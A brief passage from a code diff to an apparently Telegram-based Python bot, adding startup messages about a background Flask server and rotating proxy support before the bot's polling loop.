+    print(f"[*] Flask server started in background thread")
+    print(f"[*] Proxy support enabled with smart rotation")
     await bot.infinity_polling(timeout=60)
 
 if __name__ == '__main__':
